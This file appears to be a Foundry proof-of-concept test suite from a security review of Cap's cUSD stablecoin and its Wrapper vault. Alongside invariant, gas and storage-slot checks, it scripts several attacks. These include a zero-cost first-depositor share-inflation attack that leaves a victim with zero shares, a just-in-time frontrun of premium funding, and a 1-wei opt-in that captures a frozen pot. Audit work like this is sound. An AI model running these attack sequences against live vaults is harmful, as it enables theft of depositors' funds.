// SPDX-License-Identifier: BUSL-1.1
pragma solidity 0.8.36;

import { Stablecoin } from "../../../../../contracts/cap/Stablecoin.sol";
import { Wrapper } from "../../../../../contracts/cap/Wrapper.sol";
import { WadRayMath } from "../../../../../contracts/utils/WadRayMath.sol";
import { BaseTest } from "../../../../../test/shared/BaseTest.sol";
import { MockERC20 } from "../../../../../test/shared/mocks/MockERC20.sol";
import { MockIRM } from "../../../../../test/shared/mocks/MockIRM.sol";

contract N1PoC is BaseTest {
    using WadRayMath for uint256;
    Stablecoin internal s;
    Wrapper internal w;
    MockERC20 internal usdc;
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    address carol = makeAddr("carol");

    function setUp() public {
        vm.warp(1_000_000);
        _setUpAccessManager();
        usdc = new MockERC20("USD Coin", "USDC", 18);
        MockIRM irm = new MockIRM();
        s = Stablecoin(
            _deployProxy(
                address(new Stablecoin()),
                abi.encodeCall(
                    Stablecoin.initialize,
                    (address(accessManager), address(usdc), "Cap USD", "cUSD", "", address(irm), address(0))
                )
            )
        );
        w = Wrapper(
            _deployProxy(
                address(new Wrapper()), abi.encodeCall(Wrapper.initialize, (address(accessManager), address(s)))
            )
        );
        _dep(alice, 1000e18);
        _dep(bob, 1000e18);
    }

    function _wdep(address a, uint256 amt) internal returns (uint256 sh) {
        vm.startPrank(a);
        sh = w.deposit(amt, a);
        vm.stopPrank();
    }

    function _wred(address a) internal returns (uint256 out) {
        vm.startPrank(a);
        out = w.redeem(w.balanceOf(a), a, a);
        vm.stopPrank();
    }

    function _dep(address a, uint256 amt) internal {
        usdc.mint(a, amt);
        vm.startPrank(a);
        usdc.approve(address(s), amt);
        s.deposit(amt, a);
        s.approve(address(w), type(uint256).max);
        vm.stopPrank();
    }

    // ---------- N3: pot / queue share one balance ----------
    function test_N3_fund_queue_claim_settle() public {
        vm.prank(alice);
        s.optIn();
        s.fundCreditBacked(100e18); // pot = 100 (minted to s)
        vm.prank(bob); // queue = 500 at s
        uint256 id = s.requestRedeem(500e18, bob, bob);
        assertEq(s.balanceOf(address(s)), 600e18);
        vm.warp(block.timestamp + 365 days); // ~everything vested to alice
        vm.prank(alice);
        uint256 paid = s.claim(alice);
        assertLe(paid, 100e18, "claim paid out of queue");
        assertGe(s.balanceOf(address(s)), s.redemptionQueue(), "I13'");
        // queue settles fully: unlockedSupply = supply - credit - badDebt; bob's 500 was reserve-backed
        uint256 c = s.claimableRedeemRequest(id, bob);
        assertEq(c, 500e18);
        vm.prank(bob);
        s.redeem(id, 500e18, bob, bob);
        assertEq(s.balanceOf(address(s)), 100e18 - paid, "pot intact after queue burn");
        emit log_named_uint("paid (wei, of 100e18)", paid);
    }

    function test_N3_queue_fund_claim_settle_withBadDebt() public {
        vm.prank(alice);
        s.optIn();
        vm.prank(bob);
        uint256 id = s.requestRedeem(1000e18, bob, bob);
        s.mintCreditBacked(carol, 500e18); // credit supply so bad debt is possible
        s.fundCreditBacked(50e18);
        s.recognizeBadDebt(200e18); // haircut while queue + pot coexist
        vm.warp(block.timestamp + 3 days);
        vm.prank(alice);
        uint256 paid = s.claim(alice);
        assertLe(paid, 50e18);
        assertGe(s.balanceOf(address(s)), s.redemptionQueue());
        uint256 c = s.claimableRedeemRequest(id, bob);
        vm.prank(bob);
        uint256 out = s.redeem(id, c, bob, bob);
        emit log_named_uint("queued shares settled", c);
        emit log_named_uint("assets out (haircut)", out);
        assertEq(s.balanceOf(address(s)), 50e18 - paid + (1000e18 - c), "pot untouched by queued burn");
    }

    // ---------- N5: freeze then 1-wei opt-in ----------
    function test_N5_freeze_then_optIn_is_not_a_cliff() public {
        s.fundCreditBacked(100e18); // nobody opted in: frozen
        vm.warp(block.timestamp + 30 days);
        assertEq(s.remaining() + s.vested(), 100e18);
        s.mintCreditBacked(carol, 1); // 1 wei holder
        vm.prank(carol);
        s.optIn();
        assertEq(s.claimable(carol), 0, "opt-in must not sweep the frozen pot");
        assertEq(s.remaining(), 100e18, "freeze moved lastUpdate forward; remainder intact");
        vm.warp(block.timestamp + 12 hours);
        uint256 c12 = s.claimable(carol);
        vm.warp(block.timestamp + 5 days);
        uint256 c5d = s.claimable(carol);
        emit log_named_uint("1-wei holder claimable after 12h", c12);
        emit log_named_uint("1-wei holder claimable after 5d12h", c5d);
        assertApproxEqRel(c12, 63.2e18, 0.01e18, "12h = 1-1/e");
        assertGt(c5d, 99.9e18, "1-wei opt-in captures whole frozen pot");
    }

    function testFuzz_N5_rayPow_weight_bounded(uint256 elapsed) public pure {
        elapsed = bound(elapsed, 0, 3650 days);
        uint256 RAY = 1e27;
        uint256 r = RAY - RAY / 12 hours;
        uint256 p = r.rayPow(elapsed);
        assertLe(p, RAY);
        uint256 weight = RAY - p;
        assertLe(weight, RAY);
        if (elapsed > 0) assertLt(p, RAY);
    }

    function testFuzz_N5_weight_monotone(uint256 a, uint256 b) public pure {
        a = bound(a, 0, 3650 days);
        b = bound(b, a, 3650 days);
        uint256 RAY = 1e27;
        uint256 r = RAY - RAY / 12 hours;
        assertGe(r.rayPow(a), r.rayPow(b));
    }

    function testFuzz_N5_conservation_afterSplits(uint256 n, uint256 total) public {
        n = bound(n, 1, 40);
        total = bound(total, 1 hours, 5 days);
        vm.prank(alice);
        s.optIn();
        vm.prank(bob);
        s.optIn();
        s.fundCreditBacked(1_000e18);
        for (uint256 i; i < n; ++i) {
            vm.warp(block.timestamp + total / n);
            vm.prank(alice);
            s.transfer(bob, 1);
        }
        uint256 sum = s.claimable(alice) + s.claimable(bob) + s.remaining();
        assertLe(sum, 1_000e18);
        assertGe(sum, 1_000e18 - 2 * n - 4);
    }

    // ---------- N6: Wrapper ----------
    function test_N6_firstDepositor_inflation_costsAttacker() public {
        s.mintCreditBacked(carol, 10_000e18);
        vm.prank(carol);
        s.approve(address(w), type(uint256).max);
        _wdep(carol, 1); // 1 share
        vm.prank(carol); // donation
        s.transfer(address(w), 2_000e18);
        uint256 victim = 1_000e18;
        uint256 vs = _wdep(alice, victim);
        emit log_named_uint("victim shares", vs);
        uint256 attackerOut = w.previewRedeem(1);
        uint256 victimOut = w.previewRedeem(vs);
        emit log_named_uint("attacker gets back (put 2000e18+1)", attackerOut);
        emit log_named_uint("victim gets back (put 1000e18)", victimOut);
        assertLt(attackerOut, 2_000e18 + 1, "attacker loses");
    }

    function test_N6_totalAssets_neverOverstates_and_haircutDoesNotBlock() public {
        _wdep(alice, 500e18);
        s.mintCreditBacked(carol, 2000e18);
        s.fundCreditBacked(100e18);
        vm.warp(block.timestamp + 1 days);
        uint256 ta = w.totalAssets(); // triggers claim
        _wdep(bob, 1);
        assertGe(w.totalAssets(), ta - 1, "claim paid less than claimable projection");
        s.recognizeBadDebt(1500e18); // unlockedSupply shrinks hard
        emit log_named_uint("unlockedSupply after haircut", s.unlockedSupply());
        uint256 out = _wred(alice); // must not be blocked
        assertGt(out, 500e18, "wrapper exit blocked or lost premium");
    }

    function test_N6_JIT_frontrun_of_fundCreditBacked() public {
        _wdep(bob, 1000e18); // long-term staker
        vm.warp(block.timestamp + 1 days);
        _wdep(alice, 1000e18); // JIT, same block as the charge
        s.fundCreditBacked(100e18);
        vm.warp(block.timestamp + 12 hours);
        uint256 out = _wred(alice);
        emit log_named_uint("JIT depositor take after 12h (of 100e18, half the stake)", out - 1000e18);
        assertGt(out - 1000e18, 30e18, "JIT still captures ~half of 63%");
    }

    /// @dev N6-b: attacker is the first Wrapper depositor with 1 wei; the Wrapper is the only opted-in
    /// cUSD holder, so 100% of the liquidity premium lands in totalAssets for free and inflates the
    /// share price. Later depositors are rounded down to zero shares; the attacker keeps their cUSD.
    function test_N6b_premiumInflation_zeroCost_firstDepositor() public {
        s.mintCreditBacked(carol, 1);
        vm.prank(carol);
        s.approve(address(w), 1);
        _wdep(carol, 1); // attacker: 1 wei -> 1 share
        s.fundCreditBacked(1_000e18); // markets charge liquidity premium
        vm.warp(block.timestamp + 2 days); // wrapper (sole staker) accrues ~98%
        emit log_named_uint("wrapper totalAssets before victim", w.totalAssets());
        uint256 vs = _wdep(alice, 400e18); // victim deposits 400 cUSD
        emit log_named_uint("victim shares", vs);
        uint256 attackerOut = _wred(carol);
        emit log_named_uint("attacker cUSD out (capital: 1 wei)", attackerOut);
        assertEq(vs, 0, "victim minted zero shares");
        assertGt(attackerOut, 1_000e18 * 98 / 100 / 2 + 199e18, "attacker took half the victim deposit");
    }

    // ---------- N12: gas + slot ----------
    function test_N12_transferGas() public {
        vm.prank(alice);
        s.optIn();
        vm.prank(bob);
        s.optIn();
        s.fundCreditBacked(100e18);
        vm.warp(block.timestamp + 1 hours);
        uint256 g = gasleft();
        vm.prank(alice);
        s.transfer(bob, 1e18);
        g = g - gasleft();
        emit log_named_uint("cUSD transfer gas (accrue+rayPow+2 checkpoints)", g);
        vm.warp(block.timestamp + 3650 days);
        g = gasleft();
        vm.prank(alice);
        s.transfer(bob, 1e18);
        g = g - gasleft();
        emit log_named_uint("cUSD transfer gas after 10y gap", g);
        assertLt(g, 200_000);
    }

    function test_slot_matchesERC7201() public pure {
        bytes32 slot =
            keccak256(abi.encode(uint256(keccak256("cap.storage.PremiumVesting")) - 1)) & ~bytes32(uint256(0xff));
        assertEq(slot, bytes32(0xcd5f59be90fcb6cd1e07c030ed45d88d80c86b8efb27e0d1fc4732fdedcd1c00));
        string[9] memory ns = [
            "cap.storage.Stablecoin",
            "cap.storage.Tranche",
            "cap.storage.Underwriter",
            "cap.storage.ERC7540AsyncRedeem",
            "openzeppelin.storage.ERC20",
            "openzeppelin.storage.ERC4626",
            "openzeppelin.storage.AccessManaged",
            "openzeppelin.storage.Initializable",
            "openzeppelin.storage.ERC20Permit"
        ];
        for (uint256 i; i < ns.length; ++i) {
            uint256 o = uint256(keccak256(abi.encode(uint256(keccak256(bytes(ns[i]))) - 1)) & ~bytes32(uint256(0xff)));
            uint256 d = o > uint256(slot) ? o - uint256(slot) : uint256(slot) - o;
            assertGt(d, 1 << 64, ns[i]);
        }
    }
}
